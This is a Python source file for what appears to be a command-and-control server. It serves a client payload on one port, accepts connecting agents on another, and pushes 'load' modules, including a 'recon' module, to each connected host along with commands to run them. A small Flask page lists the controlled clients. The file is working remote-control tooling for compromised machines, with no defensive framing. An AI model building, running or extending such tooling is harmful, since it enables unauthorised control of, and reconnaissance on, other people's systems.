import socket
import struct
import threading
import thread
from flask import Flask
import json

app = Flask(__name__)


class PayloadServer(threading.Thread):
    def __init__(self, port, address="0.0.0.0"):
        super(PayloadServer, self).__init__()
        self.s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        self.s.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
        self.s.bind(('0.0.0.0', port))
        self.s.listen(1)
        print("Payload Server Listening on %s:%s" % (address, port))

    def run(self):
        while True:
            conn, addr = self.s.accept()  # Blocking
            data = (open("client.py").read())
            msg = struct.pack(">I", len(data)) + data
            conn.sendall(msg)


class ClientServer(threading.Thread):
    clients = []
    alive = True

    def __init__(self, port, address="0.0.0.0"):
        super(ClientServer, self).__init__()
        self.s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        self.s.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
        self.s.bind(('0.0.0.0', port))
        self.s.listen(0)
        print("Client Server Listening on %s:%s" % (address, port))

    def run(self):
        while True:
            conn, addr = self.s.accept()  # Blocking
            client = ClientConnection(conn, addr, len(self.clients))
            self.clients.append(client)

    def get_clients(self):
        return [c.get_info() for c in self.clients if c.alive]


class ClientConnection:
    alive = True
    addr = None
    conn = None
    id = None

    def __init__(self, conn, addr, id):
        self.conn = conn
        self.addr = addr
        self.id = id

        data = "load " + (open("modules/hello_world.py").read())
        msg = struct.pack(">I", len(data)) + data
        conn.sendall(msg)
        data = "HelloWorld print"
        msg = struct.pack(">I", len(data)) + data
        conn.sendall(msg)

        data = "load " + (open("modules/recon.py").read())
        msg = struct.pack(">I", len(data)) + data
        conn.sendall(msg)
        data = "Recon"
        msg = struct.pack(">I", len(data)) + data
        conn.sendall(msg)

    def get_info(self):
        return {"id": self.id,
                "addr": self.addr}


@app.route('/')
def index():
    print(client_server.get_clients())
    return json.dumps(client_server.get_clients())

payload_server = PayloadServer(9999, address="localhost")
client_server = ClientServer(5555, address="localhost")

payload_server.start()
client_server.start()

app.run(debug=False, use_reloader=False), ()




